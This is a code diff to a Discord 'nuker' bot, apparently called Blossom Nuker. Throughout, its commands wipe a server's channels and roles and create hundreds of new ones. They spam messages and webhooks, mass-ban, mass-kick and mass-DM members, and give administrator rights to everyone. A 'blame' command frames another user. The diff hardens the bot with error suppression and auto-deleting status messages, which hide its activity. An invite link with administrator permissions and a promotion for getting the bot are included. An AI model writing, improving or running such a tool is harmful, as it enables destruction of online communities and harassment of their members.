@@ -34,7 +34,7 @@ client = commands.Bot(
     command_prefix=";", 
     intents=intents, 
     help_command=None,
-    application_id=None  # Disables slash commands entirely
+    application_id=None
 )
 
 # ============================================================
@@ -96,7 +96,10 @@ async def on_ready():
 @client.before_invoke
 async def before_invoke(ctx):
     if ctx.guild and ctx.guild.id in whitelisted_servers and ctx.command.name in ("nuke", "nothing"):
-        await ctx.send("server whitelisted.")
+        try:
+            await ctx.send("server whitelisted.")
+        except:
+            pass
         raise commands.CheckFailure()
 
 # ============================================================
@@ -106,22 +109,35 @@ async def before_invoke(ctx):
 async def nuke(ctx):
     """Maximum speed nuke - deletes everything, creates 500 channels, 100 roles, spams."""
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     
     if not ctx.guild.me.guild_permissions.administrator:
-        await ctx.send("Need Administrator permissions.")
+        try:
+            await ctx.send("Need Administrator permissions.", delete_after=5)
+        except:
+            pass
         return
     
     guild = ctx.guild
-    await ctx.send("Nuking at maximum speed...")
+    try:
+        await ctx.send("Nuking at maximum speed...")
+    except:
+        pass
     print(f"[NUKE] Starting on {guild.name} ({guild.id}) by {ctx.author}")
 
-    # Phase 1: Delete all channels and roles in parallel
+    # Phase 1: Delete all channels and roles in parallel with error handling
     delete_tasks = []
-    delete_tasks.extend([c.delete() for c in guild.channels])
-    delete_tasks.extend([r.delete() for r in guild.roles if r.name != "@everyone"])
-    await asyncio.gather(*delete_tasks)
+    for c in guild.channels:
+        delete_tasks.append(c.delete())
+    for r in guild.roles:
+        if r.name != "@everyone":
+            delete_tasks.append(r.delete())
+    
+    await asyncio.gather(*delete_tasks, return_exceptions=True)
     print("[NUKE] Deleted all channels and roles")
 
     # Phase 2: Create 500 channels, 100 roles, change server name all at once
@@ -132,7 +148,7 @@ async def nuke(ctx):
         create_tasks.append(guild.create_role(name=f"role-{i}"))
     create_tasks.append(guild.edit(name="nuked"))
     
-    results = await asyncio.gather(*create_tasks)
+    results = await asyncio.gather(*create_tasks, return_exceptions=True)
     channels = [r for r in results if isinstance(r, discord.TextChannel)]
     print(f"[NUKE] Created {len(channels)} channels and 100 roles")
 
@@ -141,7 +157,7 @@ async def nuke(ctx):
         spam_tasks = []
         for c in channels[:50]:
             spam_tasks.append(c.send(SPAM_MESSAGE))
-        await asyncio.gather(*spam_tasks)
+        await asyncio.gather(*spam_tasks, return_exceptions=True)
         print(f"[NUKE] Spammed {len(channels[:50])} channels")
 
     # Phase 4: Report to log channel
@@ -161,7 +177,10 @@ async def nuke(ctx):
     except:
         pass
 
-    await ctx.send(f"Nuke complete. {len(channels)} channels created. Watch the carnage.")
+    try:
+        await ctx.send(f"Nuke complete. {len(channels)} channels created. Watch the carnage.", delete_after=10)
+    except:
+        pass
 
 # ============================================================
 #  OTHER COMMANDS
@@ -174,15 +193,24 @@ async def hiroshima(ctx):
 @client.command(name="spaminvite")
 async def spaminvite(ctx, amount: int = 25):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if amount <= 0:
         amount = 1
     channels = [channel for channel in ctx.guild.text_channels if channel.permissions_for(ctx.me).send_messages]
     if not channels:
-        await ctx.send("No writable channels found.")
+        try:
+            await ctx.send("No writable channels found.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Spamming...")
+    try:
+        await ctx.send(f"Spamming...", delete_after=5)
+    except:
+        pass
     sent = 0
     for channel in channels:
         for _ in range(amount):
@@ -192,40 +220,70 @@ async def spaminvite(ctx, amount: int = 25):
                 await asyncio.sleep(0.1)
             except:
                 pass
-    await ctx.send(f"Sent {sent} messages.")
+    try:
+        await ctx.send(f"Sent {sent} messages.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="kicka")
 async def kicka(ctx, member: discord.Member = None):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
 
     if member is not None:
         if member == ctx.author:
-            await ctx.send("You can't kick yourself.")
+            try:
+                await ctx.send("You can't kick yourself.", delete_after=5)
+            except:
+                pass
             return
         if member.top_role >= ctx.author.top_role and ctx.author != ctx.guild.owner:
-            await ctx.send("You can't kick someone with a higher or equal role.")
+            try:
+                await ctx.send("You can't kick someone with a higher or equal role.", delete_after=5)
+            except:
+                pass
             return
         try:
             await member.kick(reason=f"Kicked by {ctx.author}")
-            await ctx.send(f"Kicked {member.mention}")
+            try:
+                await ctx.send(f"Kicked {member.mention}", delete_after=5)
+            except:
+                pass
         except discord.Forbidden:
-            await ctx.send("I don't have permission to kick that member.")
+            try:
+                await ctx.send("I don't have permission to kick that member.", delete_after=5)
+            except:
+                pass
         except Exception as e:
-            await ctx.send(f"Error: {e}")
+            try:
+                await ctx.send(f"Error: {e}", delete_after=5)
+            except:
+                pass
         return
 
     if not ctx.author.guild_permissions.kick_members:
-        await ctx.send("You need the Kick Members permission.")
+        try:
+            await ctx.send("You need the Kick Members permission.", delete_after=5)
+        except:
+            pass
         return
 
     target_bots = [m for m in ctx.guild.members if m.bot and m.id != ctx.guild.me.id]
     if not target_bots:
-        await ctx.send("No bots found to kick.")
+        try:
+            await ctx.send("No bots found to kick.", delete_after=5)
+        except:
+            pass
         return
 
-    await ctx.send(f"Kicking {len(target_bots)} bot(s)...")
+    try:
+        await ctx.send(f"Kicking {len(target_bots)} bot(s)...", delete_after=5)
+    except:
+        pass
     kicked = 0
     failed = 0
     for m in target_bots:
@@ -234,13 +292,19 @@ async def kicka(ctx, member: discord.Member = None):
             kicked += 1
         except Exception:
             failed += 1
-    await ctx.send(f"Kicked {kicked} bot(s). {failed} failed.")
+    try:
+        await ctx.send(f"Kicked {kicked} bot(s). {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="blame")
 async def blame(ctx, member: discord.Member = None):
     """Blame someone for nuking the server."""
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     
     # Delete the command message
@@ -250,12 +314,18 @@ async def blame(ctx, member: discord.Member = None):
         pass
     
     target = member or ctx.author
-    await ctx.send(f"Blossom Nuker: {target.mention} Nuked the server")
+    try:
+        await ctx.send(f"Blossom Nuker: {target.mention} Nuked the server", delete_after=10)
+    except:
+        pass
 
 @client.command(name="credits")
 async def credits(ctx):
-    await ctx.send("Bot created by 6syj on discord")
-    await ctx.send("Get bot here: .gg/a6PrNZDP57")
+    try:
+        await ctx.send("Bot created by 6syj on discord")
+        await ctx.send("Get bot here: .gg/a6PrNZDP57")
+    except:
+        pass
 
 INVITE_URL = "https://discord.com/oauth2/authorize?client_id=1515950695679787008&permissions=8&integration_type=0&scope=bot"
 
@@ -268,39 +338,66 @@ async def getbot(ctx):
         description="Click the button below to invite the bot to your server.",
         color=discord.Color.blue(),
     )
-    await ctx.send(embed=embed, view=view)
+    try:
+        await ctx.send(embed=embed, view=view)
+    except:
+        pass
 
 @client.command(name="whitelist")
 async def whitelist(ctx, action: str, guild_id: int = None):
     if ctx.author.id != OWNER_ID:
-        await ctx.send("Restricted to bot owner.")
+        try:
+            await ctx.send("Restricted to bot owner.", delete_after=5)
+        except:
+            pass
         return
 
     if action.lower() == "add":
         if guild_id is None:
             guild_id = ctx.guild.id
         whitelisted_servers.add(guild_id)
-        await ctx.send(f"Server `{guild_id}` whitelisted.")
+        try:
+            await ctx.send(f"Server `{guild_id}` whitelisted.", delete_after=5)
+        except:
+            pass
     elif action.lower() == "remove":
         if guild_id is None:
             guild_id = ctx.guild.id
         whitelisted_servers.discard(guild_id)
-        await ctx.send(f"Server `{guild_id}` removed from whitelist.")
+        try:
+            await ctx.send(f"Server `{guild_id}` removed from whitelist.", delete_after=5)
+        except:
+            pass
     elif action.lower() == "list":
         if whitelisted_servers:
-            await ctx.send(f"Whitelisted: {', '.join(str(g) for g in whitelisted_servers)}")
+            try:
+                await ctx.send(f"Whitelisted: {', '.join(str(g) for g in whitelisted_servers)}", delete_after=10)
+            except:
+                pass
         else:
-            await ctx.send("No whitelisted servers.")
+            try:
+                await ctx.send("No whitelisted servers.", delete_after=5)
+            except:
+                pass
     else:
-        await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`")
+        try:
+            await ctx.send("Usage: `;whitelist add [guild_id]`, `;whitelist remove [guild_id]`, or `;whitelist list`", delete_after=5)
+        except:
+            pass
 
 @client.command(name="nothing")
 async def nothing(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     
-    await ctx.send("Deleting everything...")
+    try:
+        await ctx.send("Deleting everything...", delete_after=5)
+    except:
+        pass
     guild = ctx.guild
     
     for channel in list(guild.channels):
@@ -316,17 +413,29 @@ async def nothing(ctx):
             except:
                 pass
     
-    await ctx.send("Everything deleted.")
+    try:
+        await ctx.send("Everything deleted.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="banall")
 async def banall(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if not ctx.author.guild_permissions.ban_members:
-        await ctx.send("You need Ban Members permission.")
+        try:
+            await ctx.send("You need Ban Members permission.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Banning {len(ctx.guild.members)} members...")
+    try:
+        await ctx.send(f"Banning {len(ctx.guild.members)} members...", delete_after=5)
+    except:
+        pass
     banned = 0
     failed = 0
     for member in list(ctx.guild.members):
@@ -340,14 +449,23 @@ async def banall(ctx):
             await asyncio.sleep(0.2)
         except:
             failed += 1
-    await ctx.send(f"Banned {banned} members. {failed} failed.")
+    try:
+        await ctx.send(f"Banned {banned} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="dmall")
 async def dmall(ctx, *, message: str = "You have been nuked."):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Dming {len(ctx.guild.members)} members...")
+    try:
+        await ctx.send(f"Dming {len(ctx.guild.members)} members...", delete_after=5)
+    except:
+        pass
     sent = 0
     failed = 0
     for member in list(ctx.guild.members):
@@ -359,16 +477,25 @@ async def dmall(ctx, *, message: str = "You have been nuked."):
             await asyncio.sleep(0.3)
         except:
             failed += 1
-    await ctx.send(f"Dmed {sent} members. {failed} failed.")
+    try:
+        await ctx.send(f"Dmed {sent} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="roles")
 async def roles(ctx, count: int = 100):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if count > 250:
         count = 250
-    await ctx.send(f"Creating {count} roles...")
+    try:
+        await ctx.send(f"Creating {count} roles...", delete_after=5)
+    except:
+        pass
     created = 0
     failed = 0
     colors = [0xFF0000, 0x00FF00, 0x0000FF, 0xFFFF00, 0xFF00FF, 0x00FFFF]
@@ -381,32 +508,53 @@ async def roles(ctx, count: int = 100):
                 await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Created {created} roles. {failed} failed.")
+    try:
+        await ctx.send(f"Created {created} roles. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="op")
 async def op(ctx, member: discord.Member = None):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     target = member or ctx.author
     if target == ctx.guild.owner:
-        await ctx.send("Cannot OP the server owner.")
+        try:
+            await ctx.send("Cannot OP the server owner.", delete_after=5)
+        except:
+            pass
         return
     try:
         admin_role = discord.utils.get(ctx.guild.roles, name="Admin")
         if not admin_role:
             admin_role = await ctx.guild.create_role(name="Admin", permissions=discord.Permissions.all())
         await target.add_roles(admin_role)
-        await ctx.send(f"{target.mention} now has Administrator.")
+        try:
+            await ctx.send(f"{target.mention} now has Administrator.", delete_after=5)
+        except:
+            pass
     except:
-        await ctx.send("Failed to give OP. Missing permissions.")
+        try:
+            await ctx.send("Failed to give OP. Missing permissions.", delete_after=5)
+        except:
+            pass
 
 @client.command(name="del")
 async def del_channels(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send("Deleting all channels...")
+    try:
+        await ctx.send("Deleting all channels...", delete_after=5)
+    except:
+        pass
     deleted = 0
     failed = 0
     for channel in list(ctx.guild.channels):
@@ -416,17 +564,29 @@ async def del_channels(ctx):
             await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Deleted {deleted} channels. {failed} failed.")
+    try:
+        await ctx.send(f"Deleted {deleted} channels. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="rename")
 async def rename_all(ctx, *, new_name: str = "nuked"):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if not ctx.author.guild_permissions.manage_nicknames:
-        await ctx.send("You need Manage Nicknames permission.")
+        try:
+            await ctx.send("You need Manage Nicknames permission.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...")
+    try:
+        await ctx.send(f"Renaming {len(ctx.guild.members)} members to '{new_name}'...", delete_after=5)
+    except:
+        pass
     renamed = 0
     failed = 0
     for member in list(ctx.guild.members):
@@ -438,17 +598,29 @@ async def rename_all(ctx, *, new_name: str = "nuked"):
             await asyncio.sleep(0.2)
         except:
             failed += 1
-    await ctx.send(f"Renamed {renamed} members. {failed} failed.")
+    try:
+        await ctx.send(f"Renamed {renamed} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="kickall")
 async def kickall(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if not ctx.author.guild_permissions.kick_members:
-        await ctx.send("You need Kick Members permission.")
+        try:
+            await ctx.send("You need Kick Members permission.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Kicking {len(ctx.guild.members)} members...")
+    try:
+        await ctx.send(f"Kicking {len(ctx.guild.members)} members...", delete_after=5)
+    except:
+        pass
     kicked = 0
     failed = 0
     for member in list(ctx.guild.members):
@@ -462,17 +634,29 @@ async def kickall(ctx):
             await asyncio.sleep(0.2)
         except:
             failed += 1
-    await ctx.send(f"Kicked {kicked} members. {failed} failed.")
+    try:
+        await ctx.send(f"Kicked {kicked} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="unbanall")
 async def unbanall(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if not ctx.author.guild_permissions.ban_members:
-        await ctx.send("You need Ban Members permission.")
+        try:
+            await ctx.send("You need Ban Members permission.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send("Unbanning all banned members...")
+    try:
+        await ctx.send("Unbanning all banned members...", delete_after=5)
+    except:
+        pass
     unbanned = 0
     failed = 0
     try:
@@ -485,16 +669,28 @@ async def unbanall(ctx):
             except:
                 failed += 1
     except:
-        await ctx.send("Failed to fetch ban list.")
+        try:
+            await ctx.send("Failed to fetch ban list.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Unbanned {unbanned} members. {failed} failed.")
+    try:
+        await ctx.send(f"Unbanned {unbanned} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="droles")
 async def droles(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send("Deleting all roles...")
+    try:
+        await ctx.send("Deleting all roles...", delete_after=5)
+    except:
+        pass
     deleted = 0
     failed = 0
     for role in list(ctx.guild.roles):
@@ -506,17 +702,29 @@ async def droles(ctx):
             await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Deleted {deleted} roles. {failed} failed.")
+    try:
+        await ctx.send(f"Deleted {deleted} roles. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="adminall")
 async def adminall(ctx):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if not ctx.author.guild_permissions.administrator:
-        await ctx.send("You need Administrator permission.")
+        try:
+            await ctx.send("You need Administrator permission.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send("Giving admin to all members...")
+    try:
+        await ctx.send("Giving admin to all members...", delete_after=5)
+    except:
+        pass
     admin_role = discord.utils.get(ctx.guild.roles, name="AdminAll")
     if not admin_role:
         admin_role = await ctx.guild.create_role(name="AdminAll", permissions=discord.Permissions.all())
@@ -529,14 +737,23 @@ async def adminall(ctx):
             await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Gave admin to {added} members. {failed} failed.")
+    try:
+        await ctx.send(f"Gave admin to {added} members. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="wbspam")
 async def wbspam(ctx, amount: int = 10):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Creating webhooks and spamming {amount} times each...")
+    try:
+        await ctx.send(f"Creating webhooks and spamming {amount} times each...", delete_after=5)
+    except:
+        pass
     total_sent = 0
     failed = 0
     for channel in ctx.guild.text_channels:
@@ -552,18 +769,30 @@ async def wbspam(ctx, amount: int = 10):
             await webhook.delete()
         except:
             failed += 1
-    await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.")
+    try:
+        await ctx.send(f"Sent {total_sent} webhook messages. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="spam")
 async def spam(ctx, *, text: str = SPAM_MESSAGE):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     channels = [c for c in ctx.guild.text_channels if c.permissions_for(ctx.me).send_messages]
     if not channels:
-        await ctx.send("No writable channels.")
+        try:
+            await ctx.send("No writable channels.", delete_after=5)
+        except:
+            pass
         return
-    await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.")
+    try:
+        await ctx.send(f"Spamming '{text[:20]}...' in {len(channels)} channels.", delete_after=5)
+    except:
+        pass
     sent = 0
     for channel in channels:
         try:
@@ -572,16 +801,25 @@ async def spam(ctx, *, text: str = SPAM_MESSAGE):
             await asyncio.sleep(0.1)
         except:
             pass
-    await ctx.send(f"Sent to {sent} channels.")
+    try:
+        await ctx.send(f"Sent to {sent} channels.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="spamchannels")
 async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if count > 200:
         count = 200
-    await ctx.send(f"Creating {count} text channels named '{name}'...")
+    try:
+        await ctx.send(f"Creating {count} text channels named '{name}'...", delete_after=5)
+    except:
+        pass
     created = 0
     failed = 0
     for i in range(count):
@@ -592,16 +830,25 @@ async def spamchannels(ctx, count: int = 50, *, name: str = "spammed"):
                 await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Created {created} channels. {failed} failed.")
+    try:
+        await ctx.send(f"Created {created} channels. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="spamvcs")
 async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if count > 100:
         count = 100
-    await ctx.send(f"Creating {count} voice channels named '{name}'...")
+    try:
+        await ctx.send(f"Creating {count} voice channels named '{name}'...", delete_after=5)
+    except:
+        pass
     created = 0
     failed = 0
     for i in range(count):
@@ -612,16 +859,25 @@ async def spamvcs(ctx, count: int = 30, *, name: str = "vcspam"):
                 await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Created {created} voice channels. {failed} failed.")
+    try:
+        await ctx.send(f"Created {created} voice channels. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 @client.command(name="spamcats")
 async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
     if not ctx.guild:
-        await ctx.send("Use this command in a server.")
+        try:
+            await ctx.send("Use this command in a server.", delete_after=5)
+        except:
+            pass
         return
     if count > 50:
         count = 50
-    await ctx.send(f"Creating {count} categories named '{name}'...")
+    try:
+        await ctx.send(f"Creating {count} categories named '{name}'...", delete_after=5)
+    except:
+        pass
     created = 0
     failed = 0
     for i in range(count):
@@ -632,7 +888,10 @@ async def spamcats(ctx, count: int = 20, *, name: str = "catspam"):
                 await asyncio.sleep(0.1)
         except:
             failed += 1
-    await ctx.send(f"Created {created} categories. {failed} failed.")
+    try:
+        await ctx.send(f"Created {created} categories. {failed} failed.", delete_after=10)
+    except:
+        pass
 
 # ============================================================
 #  HELP COMMAND
@@ -693,7 +952,11 @@ async def help_command(ctx):
         inline=False
     )
     embed.set_footer(text="Prefix: ;")
-    await ctx.send(embed=embed)
+    
+    try:
+        await ctx.send(embed=embed)
+    except:
+        pass
 
 # ============================================================
 #  ERROR HANDLER
@@ -701,14 +964,26 @@ async def help_command(ctx):
 @client.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.CommandNotFound):
-        await ctx.send(f"Command not found. Use `;help`.")
+        try:
+            await ctx.send(f"Command not found. Use `;help`.", delete_after=5)
+        except:
+            pass
     elif isinstance(error, commands.MissingPermissions):
-        await ctx.send(f"You don't have permission.")
+        try:
+            await ctx.send(f"You don't have permission.", delete_after=5)
+        except:
+            pass
     elif isinstance(error, commands.BotMissingPermissions):
-        await ctx.send(f"I don't have permission. Missing: {error.missing_permissions}")
+        try:
+            await ctx.send(f"I don't have permission. Missing: {error.missing_permissions}", delete_after=5)
+        except:
+            pass
     else:
         print(f"[ERROR] {error}")
-        await ctx.send(f"Error: {str(error)[:100]}")
+        try:
+            await ctx.send(f"Error: {str(error)[:100]}", delete_after=5)
+        except:
+            pass
 
 # ============================================================
 #  RUN
